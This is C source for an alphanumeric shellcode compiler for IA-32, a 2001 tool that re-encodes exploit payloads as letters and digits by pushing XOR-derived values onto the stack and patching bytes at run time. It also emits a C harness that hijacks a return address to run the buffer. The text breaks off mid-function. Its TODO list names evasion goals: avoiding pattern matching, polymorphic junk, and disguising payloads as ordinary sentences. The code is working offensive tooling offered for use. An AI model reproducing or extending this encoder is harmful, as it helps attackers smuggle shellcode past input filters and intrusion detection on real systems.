/******************************************************************************
 *                ASC : IA 32 Alphanumeric Shellcode Compiler                 *
 ******************************************************************************
 *
 * VERSION: 0.9.1
 *
 *
 * LAST UPDATE: Fri Jul 27 19:42:08 CEST 2001
 *
 *
 * LICENSE:
 *  ASC - Alphanumeric Shellcode Compiler
 *
 *  Copyright 2000,2001 - rix
 *
 *  All rights reserved.
 *
 *  Redistribution and use in source and binary forms, with or without
 *  modification, are permitted provided that the following conditions
 *  are met:
 *  1. Redistributions of source code must retain the above copyright
 *     notice, this list of conditions and the following disclaimer.
 *  2. Redistributions in binary form must reproduce the above copyright
 *     notice, this list of conditions and the following disclaimer in the
 *     documentation and/or other materials provided with the distribution.
 *
 *  THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
 *  ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 *  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 *  ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
 *  FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 *  DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 *  OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 *  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 *  LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 *  OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 *  SUCH DAMAGE.
 *
 *
 * TODO:
 *  - create LibASC, a library containing all functions.
 *  - permit specification of acceptable non-alphanumeric chars.
 *  - generate padding instructions sequences.
 *  - encode alphanumeric chars, to avoid pattern matching.
 *  - insert junk instructions (polymorphic stuff) and modify existing.
 *  - optimize "patch technique" when offset < 256 and is alphanumeric.
 *  - automatically calculate padding size for "stack without jump" technique.
 *  - C output format: simulate addresses in register, padding,...
 *  - use constant address for compiled shellcode.
 *  - modify ESP starting address for "stack technique".
 *  - simple shellcode formats conversion mode (no compilation).
 *  - insert spaces and punctuation to imitate classical sentences.
 *
 *
 * CONTACT: rix <rix@hert.org>
 *
 ******************************************************************************/

#include <stdio.h>
#include <getopt.h>
#include <stdarg.h>
#include <string.h>
#include <time.h>

/* +------------------------------------------------------------------------+ */
/* |                       RANDOM NUMBERS FUNCTIONS                         | */
/* +------------------------------------------------------------------------+ */

/* initialize the pseudo-random numbers generator */
/* ============================================== */
void random_initialize() {
 srand((unsigned int)time(0));
}


/* get a random integer i (0<=i<max) */
/* ================================= */
int random_get_int(int max) {
 return (rand()%max);
}

/* +------------------------------------------------------------------------+ */
/* |                         SHELLCODES FUNCTIONS                           | */
/* +------------------------------------------------------------------------+ */

/* this structure will contain all our shellcodes */
/* ============================================== */
struct Sshellcode {
 unsigned char* opcodes; /* opcodes bytes */
 int size; /* size of the opcodes bytes */
};


/* allocate a new Sshellcode structure */
/* =================================== */
struct Sshellcode *shellcode_malloc() {
 struct Sshellcode *ret;

 if ((ret=(struct Sshellcode*)malloc(sizeof(struct Sshellcode)))!=NULL) {
  ret->opcodes=NULL;
  ret->size=0;
 }
 return ret;
}


/* initialize an existing Sshellcode structure */
/* =========================================== */
void shellcode_zero(struct Sshellcode *shellcode) {
 if (shellcode==NULL) return;

 if (shellcode->opcodes!=NULL) free(shellcode->opcodes);
 shellcode->opcodes=NULL;
 shellcode->size=0;
}


/* free an existing Sshellcode structure */
/* ===================================== */
void shellcode_free(struct Sshellcode *shellcode) {
 if (shellcode!=NULL) {
  shellcode_zero(shellcode);
  free(shellcode);
 }
}


/* return an allocated string from an existing Sshellcode */
/* ====================================================== */
char *shellcode_malloc_string(struct Sshellcode *shellcode) {
 char *ret;

 if (shellcode==NULL) return NULL;

 if (shellcode->opcodes==NULL) return "";

 if ((ret=(char*)malloc(shellcode->size+1))==NULL) return NULL;
 memcpy(ret,shellcode->opcodes,shellcode->size);
 ret[shellcode->size]=0;
 return ret;
}


/* overwrite an existing Sshellcode with a Sshellcode */
/* ================================================== */
struct Sshellcode *shellcode_cpy(struct Sshellcode *destination,struct Sshellcode *source) {
 if (destination==NULL) return NULL;

 shellcode_zero(destination);

 if (source!=NULL) {
  if (source->opcodes!=NULL) { /* if source contains a shellcode, we copy it */
   if ((destination->opcodes=(unsigned char*)malloc(source->size))==NULL) return NULL;
   memcpy(destination->opcodes,source->opcodes,source->size);
   destination->size=source->size;
  }
 }

 return destination;
}


/* append a Sshellcode at the end of an existing Sshellcode */
/* ======================================================== */
struct Sshellcode *shellcode_cat(struct Sshellcode *destination,struct Sshellcode *source) {
 if (destination==NULL) return NULL;

 if (destination->opcodes==NULL) shellcode_cpy(destination,source);
 else { /* destination already contains a shellcode */

  if (source!=NULL) {
   if (source->opcodes!=NULL) { /* if source contain a shellcode, we copy it */

    if ((destination->opcodes=(unsigned char*)realloc(destination->opcodes,
         destination->size+source->size))==NULL) return NULL;
    memcpy(destination->opcodes+destination->size,source->opcodes,source->size);
    destination->size+=source->size;
   }
  }
 }
 return destination;
}


/* add a byte at the end of an existing Sshellcode */
/* =============================================== */
struct Sshellcode *shellcode_db(struct Sshellcode *destination,unsigned char c) {
 struct Sshellcode *ret,*tmp;

 /* build a tiny one byte Sshellcode */
 tmp=shellcode_malloc();
 if ((tmp->opcodes=(unsigned char*)malloc(1))==NULL) return NULL;
 tmp->opcodes[0]=c;
 tmp->size=1;

 /* copy it at the end of the existing Sshellcode */
 ret=shellcode_cat(destination,tmp);
 shellcode_free(tmp);
 return ret;
}


/* read a Sshellcode from a binary file */
/* ==================================== */
int shellcode_read_binary(struct Sshellcode *shellcode,char *filename) {
 FILE *f;
 int size;

 if (shellcode==NULL) return -1;

 if ((f=fopen(filename,"r+b"))==NULL) return -1;

 fseek(f,0,SEEK_END);
 size=(int)ftell(f);
 fseek(f,0,SEEK_SET);

 if ((shellcode->opcodes=(unsigned char*)realloc(shellcode->opcodes,shellcode->size+size))==NULL) return -1;
 if (fread(shellcode->opcodes+shellcode->size,size,1,f)!=1) {
  shellcode_zero(shellcode);
  return -1;
 }
 shellcode->size+=size;
 fclose(f);
 return shellcode->size;
}


/* read a Sshellcode from a C file */
/* =============================== */
#define LINE_SIZE 80*256
#define HEXADECIMALS "0123456789ABCDEF"

int shellcode_read_C(struct Sshellcode *shellcode,char *filename,char *variable) {
 FILE *f;
 struct Sshellcode *binary;
 unsigned char *hex,*p,c;
 int i;

 if (shellcode==NULL) return -1;

 hex=HEXADECIMALS;
 binary=shellcode_malloc();
 if (shellcode_read_binary(binary,filename)==-1) {
  shellcode_free(binary);
  return -1;
 }
 shellcode_db(binary,0); /* for string searching */
 p=binary->opcodes;

 while (p=strstr(p,"char ")) { /* "char " founded */
  p+=5;
  while (*p==' ') p++;
  if (!variable) { /* if no variable was specified */
   while ((*p!=0)&&(*p!='[')) p++; /* search for the '[' */
   if (*p==0) {
   shellcode_free(binary);
    return -1;
   }
  }
  else { /* a variable was specified */
   if (memcmp(p,variable,strlen(variable))) continue; /* compare the variable */
   p+=strlen(variable);
   if (*p!='[') continue;
  }
  /* *p='[' */
  p++;
  if (*p!=']') continue;
  /* *p=']' */
  p++;
  while ((*p==' ')||(*p=='\r')||(*p=='\n')||(*p=='\t')) p++;
  if (*p!='=') continue;
  /* *p='=' */
  p++;
  while (1) { /* search for the beginning of a "string" */
   while ((*p==' ')||(*p=='\r')||(*p=='\n')||(*p=='\t')) p++;

   while ((*p=='/')&&(*(p+1)=='*')) { /* loop until the beginning of a comment */
    p+=2;
    while ((*p!='*')||(*(p+1)!='/')) p++; /* search for the end of the comment */
    p+=2;
    while ((*p==' ')||(*p=='\r')||(*p=='\n')||(*p=='\t')) p++;
   }

   if (*p!='"') break; /* if this is the end of all "string" */
   /* *p=begin '"' */
   p++;
   while (*p!='"') { /* loop until the end of the "string" */
    if (*p!='\\') {
     shellcode_db(shellcode,*p);
    }
    else {
     /* *p='\' */
     p++;
     if (*p=='x') {
      /* *p='x' */
      p++;
      *p=toupper(*p);
      for (i=0;i<strlen(hex);i++) if (hex[i]==*p) c=i<<4; /* first digit */
      p++;
      *p=toupper(*p);
      for (i=0;i<strlen(hex);i++) if (hex[i]==*p) c=c|i; /* second digit */
      shellcode_db(shellcode,c); 
     }  
    }
    p++;
   }
   /* end of a "string" */
   p++;
  }
  /* end of all "string" */
  shellcode_free(binary);
  return shellcode->size;
 }
 shellcode_free(binary);
 return -1;
}


/* write a Sshellcode to a binary file */
/* =================================== */
int shellcode_write_binary(struct Sshellcode *shellcode,char *filename) {
 FILE *f;

 if (shellcode==NULL) return -1;

 if ((f=fopen(filename,"w+b"))==NULL) return -1;

 if (fwrite(shellcode->opcodes,shellcode->size,1,f)!=1) return -1;
 fclose(f);
 return shellcode->size;
}


/* write a Sshellcode to a C file */
/* ============================== */
int shellcode_write_C(struct Sshellcode *shellcode,char *filename) {
 FILE *f;
 char *tmp;
 int size;

 if (shellcode==NULL) return -1;

 if ((tmp=shellcode_malloc_string(shellcode))==NULL) return -1;

 if ((f=fopen(filename,"w+b"))==NULL) return -1; 

 fprintf(f,"char shellcode[]=\"%s\";\n",tmp);
 free(tmp);
 fprintf(f,"\n");
 fprintf(f,"int main(int argc, char **argv) {\n");
 fprintf(f," int *ret;\n");

 size=1;
 while (shellcode->size*2>size) size*=2;

 fprintf(f," char buffer[%d];\n",size);
 fprintf(f,"\n");
 fprintf(f," strcpy(buffer,shellcode);\n");
 fprintf(f," ret=(int*)&ret+2;\n");
 fprintf(f," (*ret)=(int)buffer;\n");
 fprintf(f,"}\n");

 fclose(f);
 return shellcode->size;
}


/* print a Sshellcode on the screen */
/* ================================ */
int shellcode_print(struct Sshellcode *shellcode) {
 char *tmp;

 if (shellcode==NULL) return -1;

 if ((tmp=shellcode_malloc_string(shellcode))==NULL) return -1;
 printf("%s",tmp);
 free(tmp);
 return shellcode->size;
}

/* +------------------------------------------------------------------------+ */
/* |                        IA32 MACROS DEFINITIONS                         | */
/* +------------------------------------------------------------------------+ */

/* usefull macro definitions */
/* ========================= */
/*
 SYNTAX:
  r=register
  d=dword
  w=word
  b,b1,b2,b3,b4=bytes
  n=integer index
  s=Sshellcode
*/

/* registers */
#define EAX 0
#define EBX 3
#define ECX 1
#define EDX 2
#define ESI 6
#define EDI 7
#define ESP 4
#define EBP 5
#define REGISTERS 8

/* boolean operators (bytes) */
#define XOR(b1,b2) (((b1&~b2)|(~b1&b2))&0xFF)
#define NOT(b) ((~b)&0xFF)

/* type constructors */
#define DWORD(b1,b2,b3,b4) ((b1<<24)|(b2<<16)|(b3<<8)|b4) /* 0xb1b2b3b4 */
#define WORD(b1,b2) ((b1<<8)|b2) /* 0xb1b2 */

/* type extractors  (0=higher 3=lower) */
#define BYTE(d,n) ((d>>(n*8))&0xFF) /* get n(0-3) byte from (d)word d */


/* IA32 alphanumeric instructions definitions */
/* ========================================== */

#define DB(s,b) shellcode_db(s,b);

/* dw b1 b2 */
#define DW(s,w)  \
 DB(s,BYTE(w,0)) \
 DB(s,BYTE(w,1)) \

/* dd b1 b2 b3 b4 */
#define DD(s,d)  \
 DB(s,BYTE(d,0)) \
 DB(s,BYTE(d,1)) \
 DB(s,BYTE(d,2)) \
 DB(s,BYTE(d,3)) \

#define XOR_ECX_DH(s) \
 DB(s,'0')            \
 DB(s,'1')            \

#define XOR_ECX_BH(s) \
 DB(s,'0')            \
 DB(s,'9')            \

#define XOR_ECX_ESI(s) \
 DB(s,'1')             \
 DB(s,'1')             \

#define XOR_ECX_EDI(s) \
 DB(s,'1')             \
 DB(s,'9')             \

// xor [base+2*index+disp8],r8
#define XORsib8(s,base,index,disp8,r8) \
 DB(s,'0')                             \
 DB(s,(01<<6|r8   <<3|4   ))           \
 DB(s,(01<<6|index<<3|base))           \
 DB(s,disp8)                           \

// xor [base+2*index+disp8],r32
#define XORsib32(s,base,index,disp8,r32) \
 DB(s,'1')                               \
 DB(s,(01<<6|r32  <<3|4   ))             \
 DB(s,(01<<6|index<<3|base))             \
 DB(s,disp8)                             \

#define XOR_AL(s,b) \
 DB(s,'4')          \
 DB(s,b)            \

#define XOR_AX(s,w) \
 O16(s)             \
 DB(s,'5')          \
 DW(s,w)            \

#define XOR_EAX(s,d) \
 DB(s,'5')           \
 DD(s,d)             \

#define INCr(s,r) DB(s,('A'-1)|r)
#define DECr(s,r) DB(s,'H'|r)
#define PUSHr(s,r) DB(s,'P'|r)
#define POPr(s,r) DB(s,'X'|r)
#define POPAD(s) DB(s,'a')
#define O16(s) DB(s,'f')

#define PUSHd(s,d) \
 DB(s,'h')         \
 DD(s,d)           \

#define PUSHw(s,w) \
 O16(s)            \
 DB(s,'h')         \
 DW(s,w)           \

#define PUSHb(s,b) \
 DB(s,'j')         \
 DB(s,b)           \

#define INT3(s) \
 DB(s,'\xCC')   \

#define CALL_ESP(s) \
 DB(s,'\xFF')       \
 DB(s,'\xD4')       \

#define JMP_ESP(s) \
 DB(s,'\xFF')      \
 DB(s,'\xE4')      \

#define RET(s) \
 DB(s,'\xC3')  \

/* +------------------------------------------------------------------------+ */
/* |                    ALPHANUMERIC MANIPULATIONS FUNCTIONS                | */
/* +------------------------------------------------------------------------+ */

#define ALPHANUMERIC_BYTES "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMOPQRSTUVWXYZ"

/* return 1 if the byte is alphanumeric */
/* ==================================== */
int alphanumeric_check(unsigned char c) {
 if (c<'0') return 0;
 else if (c<='9') return 1;
 else if (c<'A') return 0;
 else if (c<='Z') return 1;
 else if (c<'a') return 0;
 else if (c<='z') return 1;
 else return 0;
}


/* return a random alphanumeric byte */
/* ================================= */
unsigned char alphanumeric_get_byte() {
 unsigned char *bytes=ALPHANUMERIC_BYTES;

 return bytes[random_get_int(strlen(bytes))];
}


/* return a random alphanumeric byte b (c=CATEGORY_XOR,(b XOR(b XOR c))) */
/* ===================================================================== */
unsigned char alphanumeric_get_complement(unsigned char c) {
 unsigned char ret;

 while (1) {
  ret=alphanumeric_get_byte();
  if (alphanumeric_check(XOR(c,ret))) return ret;
 }
}

/* +------------------------------------------------------------------------+ */
/* |                      REGISTERS MANIPULATIONS FUNCTIONS                 | */
/* +------------------------------------------------------------------------+ */

/* return a random register in a set of allowed registers */
/* ====================================================== */
#define M_EAX (1<<EAX)
#define M_EBX (1<<EBX)
#define M_ECX (1<<ECX)
#define M_EDX (1<<EDX)
#define M_ESI (1<<ESI)
#define M_EDI (1<<EDI)
#define M_ESP (1<<ESP)
#define M_EBP (1<<EBP)
#define M_REGISTERS (M_EAX|M_EBX|M_ECX|M_EDX|M_ESI|M_EDI|M_ESP|M_EBP)

int alphanumeric_get_register(int mask) {
 int regs[REGISTERS];
 int size,i;

 size=0;
 for (i=0;i<REGISTERS;i++) { /* for all possible registers */
  if (mask&(1<<i)) regs[size++]=i; /* add the register if it is in our mask */
 }
 return regs[random_get_int(size)];
}


/* return a "POPable" register (ECX|EDX) with the shellcode's base address using the return address on the stack */
/* ============================================================================================================= */
int alphanumeric_get_address_stack(struct Sshellcode *s) {
 unsigned char ret;

 if (s==NULL) return -1;

 DECr(s,ESP); /* dec esp */
 DECr(s,ESP); /* dec esp */
 DECr(s,ESP); /* dec esp */
 DECr(s,ESP); /* dec esp */
 ret=alphanumeric_get_register(M_ECX|M_EDX); /* get a random register */
 POPr(s,ret); /* pop ecx/edx =>pop the return value from the stack */
 return ret;
}


/* initialize registers (reg=shellcode's base address) */
/* =================================================== */
int alphanumeric_initialize_registers(struct Sshellcode *s,unsigned char reg) {
 unsigned char b[4];
 int i;

 if (s==NULL) return -1;

 if (reg==EAX) {
  PUSHr(s,EAX);                                   /* push eax =>address */
  reg=alphanumeric_get_register(M_ECX|M_EDX); /* get a random register */
  POPr(s,reg);                                    /* pop ecx/edx */
 }
 for (i=0;i<4;i++) b[i]=alphanumeric_get_byte(); /* get a random alphanumeric dword */
 PUSHd(s,DWORD(b[0],b[1],b[2],b[3]));             /* push '????' */
 POPr(s,EAX);                                     /* pop eax */ 
 XOR_EAX(s,DWORD(b[0],b[1],b[2],b[3]));           /* xor eax,'????' =>EAX=0 */
 DECr(s,EAX);                                     /* dec eax  =>EAX=FFFFFFFF */
 PUSHr(s,alphanumeric_get_register(M_REGISTERS)); /* push r32 =>EAX */
 PUSHr(s,alphanumeric_get_register(M_REGISTERS)); /* push r32 =>ECX */
 PUSHr(s,EAX);                                    /* push eax =>EDX=FFFFFFFF */
 PUSHr(s,EAX);                                    /* push eax =>EBX=FFFFFFFF */
 PUSHr(s,alphanumeric_get_register(M_REGISTERS)); /* push r32 =>ESP */
 PUSHr(s,reg);                                    /* push reg =>EBP=address */
 PUSHr(s,EAX);                                    /* push eax =>ESI=FFFFFFFF */
 PUSHr(s,EAX);                                    /* push eax =>EDI=FFFFFFFF */
 POPAD(s);                                        /* popad */
 return 0;
}

/* +------------------------------------------------------------------------+ */
/* |                        STACK MANIPULATIONS FUNCTIONS                   | */
/* +------------------------------------------------------------------------+ */

/* return the category of the byte */
/* =============================== */
#define CATEGORY_NULL 0
#define CATEGORY_00 1
#define CATEGORY_FF 2
#define CATEGORY_ALPHA 3
#define CATEGORY_ALPHA_NOT 4
#define CATEGORY_XOR 5
#define CATEGORY_XOR_NOT 6

int alphanumeric_stack_get_category(unsigned char c) {
 if (c==0) return CATEGORY_00;
 else if (c==0xFF) return CATEGORY_FF;
 else if (alphanumeric_check(c)) return CATEGORY_ALPHA;
 else if (c<0x80) return CATEGORY_XOR;
 else { /* need a NOT */
  c=NOT(c);
  if (alphanumeric_check(c)) return CATEGORY_ALPHA_NOT;
  else return CATEGORY_XOR_NOT;
 }
}


/* make a NOT on 1,2,3 or 4 bytes on the stack */
/* =========================================== */
int alphanumeric_stack_generate_not(struct Sshellcode *s,int size) {
 if (s==NULL) return -1;

 PUSHr(s,ESP); /* push esp */
 POPr(s,ECX);  /* pop ecx */

 switch(size) {
 case 1:
  if (alphanumeric_get_register(M_EDX|M_EBX)==EDX) {
   XOR_ECX_DH(s); /* xor [ecx],dh */
  }
  else {
   XOR_ECX_BH(s); /* xor [ecx],bh */
  }
  break;

 case 2:
  if (alphanumeric_get_register(M_ESI|M_EDI)==ESI) {
   O16(s);XOR_ECX_ESI(s); /* xor [ecx],si */
  }
  else {
   O16(s);XOR_ECX_EDI(s); /* xor [ecx],di */
  }
  break;

 case 3:
  DECr(s,ECX);     /* dec ecx */
 case 4:
  if (alphanumeric_get_register(M_ESI|M_EDI)==ESI) {
   XOR_ECX_ESI(s); /* xor [ecx],esi */
  }
  else {
   XOR_ECX_EDI(s); /* xor [ecx],edi */
  }
  break;
 }
 return 0;
}


/* generate 1,2,3 or 4 bytes from a category on the stack */
/* ====================================================== */
#define SB1 b[size-1]
#define SB2 b[size-2]
#define SB3 b[size-3]
#define SB4 b[size-4]

int alphanumeric_stack_generate_push(struct Sshellcode *s,int category,unsigned char *bytes,int size) {
 int reg,i;
 unsigned char b[4];
 unsigned char xSB1,xSB2,xSB3,xSB4;

 if (s==NULL) return -1;

 memcpy(b,bytes,4);

 /* possibly realize a NOT on b[] */
 if ((category==CATEGORY_ALPHA_NOT)||(category==CATEGORY_XOR_NOT)) {
  for (i=0;i<size;i++) b[i]=NOT(b[i]);
 }

 /* generate bytes on the stack */
 switch(category) {
 case CATEGORY_00:
 case CATEGORY_FF:
  reg=alphanumeric_get_register(M_EDX|M_EBX|M_ESI|M_EDI);
  if (category==CATEGORY_00) INCr(s,reg); /* inc r16 =>r16=0*/
  switch(size) {
  case 1:
   O16(s);PUSHr(s,reg); /* push r16 */
   INCr(s,ESP);         /* inc esp */
   break;
  case 2:
   O16(s);PUSHr(s,reg); /* push r16 */
   break;
  case 3:
   PUSHr(s,reg); /* push r32 */
   INCr(s,ESP);  /* inc esp */
   break;
  case 4:
   PUSHr(s,reg); /* push r32 */
   break;
  }
  if (category==CATEGORY_00) DECr(s,reg); /* dec r16 =>r16=FFFFFFFF */
  break;

 case CATEGORY_ALPHA:
 case CATEGORY_ALPHA_NOT:
  switch(size) {
  case 1:
   PUSHw(s,WORD(SB1,alphanumeric_get_byte())); /* push SB1 */
   INCr(s,ESP);                                /* inc esp */
   break;
  case 2:
   PUSHw(s,WORD(SB1,SB2)); /* push SB1 SB2 */
   break;
  case 3:
   PUSHd(s,DWORD(SB1,SB2,SB3,alphanumeric_get_byte())); /* push SB1 SB2 SB3 */
   INCr(s,ESP);                                         /* inc esp */
   break;
  case 4:
   PUSHd(s,DWORD(SB1,SB2,SB3,SB4)); /* push SB1 SB2 SB3 SB4 */
   break;
  }
  break;

 case CATEGORY_XOR:
 case CATEGORY_XOR_NOT:
  switch(size) {
  case 1:
   xSB1=alphanumeric_get_complement(SB1);
   PUSHw(s,WORD(XOR(SB1,xSB1),alphanumeric_get_byte())); /* push ~xSB1 */
   O16(s);POPr(s,EAX);                           /* pop ax */
   XOR_AX(s,WORD(xSB1,alphanumeric_get_byte())); /* xor ax,xSB1 =>EAX=SB1 */
   O16(s);PUSHr(s,EAX);                          /* push ax */
   INCr(s,ESP);                                  /* inc esp */
   break;
  case 2:
   xSB1=alphanumeric_get_complement(SB1);
   xSB2=alphanumeric_get_complement(SB2);
   PUSHw(s,WORD(XOR(SB1,xSB1),XOR(SB2,xSB2))); /* push ~xSB1 ~xSB2 */
   O16(s);POPr(s,EAX);        /* pop ax */
   XOR_AX(s,WORD(xSB1,xSB2)); /* xor ax,xSB1 xSB2 =>EAX=SB1 SB2 */
   O16(s);PUSHr(s,EAX);       /* push ax */
   break;
  case 3:
   xSB1=alphanumeric_get_complement(SB1);
   xSB2=alphanumeric_get_complement(SB2);
   xSB3=alphanumeric_get_complement(SB3);
   PUSHd(s,DWORD(XOR(SB1,xSB1),XOR(SB2,xSB2),XOR(SB3,xSB3),alphanumeric_get_byte())); /* push ~xSB1 ~xSB2 ~xSB3 */
   POPr(s,EAX);                                              /* pop eax */
   XOR_EAX(s,DWORD(xSB1,xSB2,xSB3,alphanumeric_get_byte())); /* xor eax,xSB1 xSB2 xSB3 =>EAX=SB1 SB2 SB3 */
   PUSHr(s,EAX);                                             /* push eax */
   INCr(s,ESP);                                              /* inc esp */
   break;
  case 4:
   xSB1=alphanumeric_get_complement(SB1);
   xSB2=alphanumeric_get_complement(SB2);
   xSB3=alphanumeric_get_complement(SB3);
   xSB4=alphanumeric_get_complement(SB4);
   PUSHd(s,DWORD(XOR(SB1,xSB1),XOR(SB2,xSB2),XOR(SB3,xSB3),XOR(SB4,xSB4))); /* push ~xSB1 ~xSB2 ~xSB3 ~xSB4 */
   POPr(s,EAX);                           /* pop eax */
   XOR_EAX(s,DWORD(xSB1,xSB2,xSB3,xSB4)); /* xor eax,xSB1 xSB2 xSB3 xSB4 =>EAX=SB1 SB2 SB3 SB4 */
   PUSHr(s,EAX);                          /* push eax */
   break;
  }
  break;
 }

 /* possibly realize a NOT on the stack */
 if ((category==CATEGORY_ALPHA_NOT)||(category==CATEGORY_XOR_NOT)) alphanumeric_stack_generate_not(s,size);

 return 0;
}


/* generate the original shellcode on the stack */
/* ============================================ */
int alphanumeric_stack_generate(struct Sshellcode *output,struct Sshellcode *input) {
 int category,size,i;

 if (input==NULL) return -1;
 if (output==NULL) return -1;

 i=input->size-1;
 while (i>=0) { /* loop from the right to the left of our original shellcode */
  category=alphanumeric_stack_get_category(input->opcodes[i]);
  size=1; /* by default, we have 1 byte of the same category */

  /* loop until maximum 3 previous bytes are from the same category */
  while ((i-size>=0)&&(size<4)&&(alphanumeric_stack_get_category(input->opcodes[i-size])==category)) size++;

  /* write those bytes on the stack */
  alphanumeric_stack_generate_push(output,category,&input->opcodes[i-size+1],size);

  i-=size;
 }
 return 0;
}

/* +------------------------------------------------------------------------+ */
/* |                       PATCHES MANIPULATIONS FUNCTIONS                  | */
/* +------------------------------------------------------------------------+ */

/* return the category of the byte */
/* =============================== */
int alphanumeric_patches_get_category(unsigned char c) {
 if (alphanumeric_check(c)) return CATEGORY_ALPHA;
 else if (c<0x80) return CATEGORY_XOR;
 else { /* need a NOT */
  c=NOT(c);
  if (alphanumeric_check(c)) return CATEGORY_ALPHA_NOT;
  else return CATEGORY_XOR_NOT;
 }
}


/* generate the patches initialization shellcode */
/* ============================================ */
int alphanumeric_patches_generate_initialization(struct Sshellcode *shellcode,
int patcher_size,int alpha_begin,int base,unsigned char disp8) {
 struct Sshellcode *s;
 int offset; /* real offset for original shellcode to patch */
 struct Sshellcode *p_offset; /* offset "shellcode" */
 int fill_size; /* size to add to the initialization shellcode to align */
 int initialization_size,i;

 if (shellcode==NULL) return -1;

 initialization_size=0;
 while(1) { /* loop until we create a valid initialization shellcode */
  s=shellcode_malloc();
  fill_size=0;

  PUSHr(s,alphanumeric_get_register(M_REGISTERS));  /* push r32 =>EAX */
  PUSHr(s,alphanumeric_get_register(M_REGISTERS));  /* push r32 =>ECX */
  PUSHr(s,alphanumeric_get_register(M_EDX|M_EBX|M_ESI|M_EDI)); /* push FFFFFFFF =>EDX */
  if (base==EBX) {
   PUSHr(s,EBP);                                    /* push ebp =>EBX */
  }
  else {
   PUSHr(s,alphanumeric_get_register(M_REGISTERS)); /* push r32 =>EBX */
  }
  PUSHr(s,alphanumeric_get_register(M_REGISTERS));  /* push r32 =>ESP */

  offset=shellcode->size+initialization_size+patcher_size+alpha_begin-disp8; /* calculate the real offset */

  /* if the offset is not correct we must modify the size of our initialization shellcode */
  if (offset<0) { /* align to have a positive offset */
   fill_size=-offset;
   offset=0;
  }
  if (offset&1) { /* align for the 2*ebp */
   fill_size++;
   offset++;
  }
  offset/=2;

  p_offset=shellcode_malloc();
  DB(p_offset,BYTE(offset,0));
  DB(p_offset,BYTE(offset,1));
  DB(p_offset,BYTE(offset,2));
  DB(p_offset,BYTE(offset,3));
  alphanumeric_stack_generate(s,p_offset);          /* push offset => EBP */
  shellcode_free(p_offset);

  PUSHr(s,alphanumeric_get_register(M_EDX|M_EBX|M_ESI|M_EDI)); /* push FFFFFFFF =>ESI */
  if (base==EDI) {
   PUSHr(s,EBP);                                    /* push ebp =>EDI */
  }
  else {
   PUSHr(s,alphanumeric_get_register(M_REGISTERS)); /* push r32 =>EDI */
  }
  POPAD(s);                                         /* popad */

  if (s->size<=initialization_size) break; /* if the offset is good */

  initialization_size++;
 }
 /* the offset is good */

 /* fill to reach the initialization_size value */
 while (s->size<initialization_size) INCr(s,ECX);
 /* fill to reach the offset value */
 for (i=0;i<fill_size;i++) INCr(s,ECX);

 shellcode_cat(shellcode,s);
 shellcode_free(s);
 return 0;
}


/* generate the xor patch */
/* ====================== */
#define PB1 bytes[0]
#define PB2 bytes[1]
#define PB3 bytes[2]
#define PB4 bytes[3]

int alphanumeric_patches_generate_xor(struct Sshellcode *s,int category,
                     unsigned char *bytes,int size,int base,char disp8) {
 unsigned char xPB1,xPB2,xPB3,xPB4;
 int reg,i;

 if (s==NULL) return -1;

 /* eventually realize a NOT on bytes[] */
 if ((category==CATEGORY_ALPHA_NOT)||(category==CATEGORY_XOR_NOT)) {
  for (i=0;i<size;i++) bytes[i]=NOT(bytes[i]);
 }

  /* generate the bytes in the original shellcode */
 switch(category) {
 case CATEGORY_ALPHA:
 case CATEGORY_ALPHA_NOT:
  /* nothing to do */
  break;
 case CATEGORY_XOR:
 case CATEGORY_XOR_NOT:
  reg=alphanumeric_get_register(M_EAX|M_ECX);
  switch(size) {
  case 1:
   xPB1=alphanumeric_get_complement(PB1);
   PUSHb(s,XOR(PB1,xPB1));        /* push ~xPB1 */
   POPr(s,reg);                   /* pop reg */
   PB1=xPB1;                      /* modify into the original shellcode */
   XORsib8(s,base,EBP,disp8,reg); /* xor [base+2*ebp+disp8],reg => xor xPB1,~xPB1 */
   break;
  case 2:
   xPB1=alphanumeric_get_complement(PB1);
   xPB2=alphanumeric_get_complement(PB2);
   PUSHw(s,WORD(XOR(PB2,xPB2),XOR(PB1,xPB1))); /* push ~xPB2 ~xPB1 */
   O16(s);POPr(s,reg); /* pop reg */
   PB1=xPB1;           /* modify into the original shellcode */
   PB2=xPB2;
   O16(s);XORsib32(s,base,EBP,disp8,reg); /* xor [base+2*ebp+disp8],reg => xor xPB2 xPB1,~xPB2 ~xPB1 */
   break;
  case 4:
   xPB1=alphanumeric_get_complement(PB1);
   xPB2=alphanumeric_get_complement(PB2);
   xPB3=alphanumeric_get_complement(PB3);
   xPB4=alphanumeric_get_complement(PB4);
   PUSHd(s,DWORD(XOR(PB4,xPB4),XOR(PB3,xPB3),XOR(PB2,xPB2),XOR(PB1,xPB1))); /* push ~xPB4 ~xPB3 ~xPB2 ~xPB1 */
   POPr(s,reg); /* pop reg */
   PB1=xPB1;    /* modify into the original shellcode */
   PB2=xPB2;
   PB3=xPB3;
   PB4=xPB4;
   XORsib32(s,base,EBP,disp8,reg); /* xor [base+2*ebp+disp8],reg => xor xPB4 xPB3 xPB2 xPB1,~xPB4 ~xPB3 ~xPB2 ~xPB1 */
   break;
  }
  break;
 }

 /* eventually realize a NOT on the shellcode */
 if ((category==CATEGORY_ALPHA_NOT)||(category==CATEGORY_XOR_NOT)) {
  reg=alphanumeric_get_register(M_EDX|M_ESI);
  switch(size) {
  case 1:
   XORsib8(s,base,EBP,disp8,reg); /* xor [base+2*ebp+disp8],dl/dh */
   break;
  case 2:
   O16(s);XORsib32(s,base,EBP,disp8,reg); /* xor [base+2*ebp+disp8],dx/si */
   break;
  case 4:
